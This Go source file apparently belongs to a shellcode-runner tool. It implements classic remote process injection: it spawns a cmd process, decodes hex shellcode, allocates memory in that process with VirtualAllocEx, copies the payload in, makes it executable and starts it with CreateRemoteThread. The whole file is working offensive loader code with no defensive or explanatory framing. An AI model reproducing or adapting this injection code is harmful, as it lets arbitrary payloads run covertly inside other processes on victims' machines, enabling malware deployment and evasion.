package shellcode

import (
	"encoding/hex"
	dll "goShellcodeRunner/DLL"
	process "goShellcodeRunner/Process"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func ClassicInjection() {
	cmdHandle := process.CreateCmdProcess()

	// TODO: 1. WriteProcessMemory() Also Can Use CopyShellcodeToMemory()
	shellcode, unhandledErr := hex.DecodeString(HexShellcode)
	if unhandledErr != nil {
		log.Panicf(" unhandledErr \n")
	}

	procVirtualAllocEx := dll.Kernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(cmdHandle),
		uintptr(0),
		uintptr(len(shellcode)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE))

	if addr == 0 {
		log.Panicf("[INJECT] Failed To Allocate New Memory To Process; VirtualAllocEx() (%v) \n", lastErr)
	}

	log.Printf("[INJECT] Memory Allocation Done, Address: 0x(%x)", addr)

	CopyShellcodeToMemory(addr, &shellcode)

	log.Printf("[INJECT] Shellcode Moved To Process Memory \n")

	ChangeRemoteProcessPermission(windows.Handle(cmdHandle), addr, len(shellcode), windows.PAGE_EXECUTE_READ)

	CreateRemoteThread(cmdHandle, addr)

}

func ChangeRemoteProcessPermission(pHandle windows.Handle, addr uintptr, size int, newProtect uint32) {
	var oldProted uint32

	err := windows.VirtualProtectEx(pHandle, addr, uintptr(size), newProtect, &oldProted)

	if err != nil {
		log.Panicf("[INJECT] Error While Change RemoteProcess MemoryProtect (%v) \n", err)

	}

}

func CreateRemoteThread(pHandle syscall.Handle, addr uintptr) {
	procCreateRemoteThread := dll.Kernel32.NewProc("CreateRemoteThread")

	var threadId uint32 = 0

	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&threadId)))

	if tHandle == 0 {
		log.Panicf("[INJECT] Error While Creating Remote Thraed (%v) \n", lastErr)

	}
	log.Printf("[INJECT] Shellcode Execution Done! %v \n", tHandle)
}
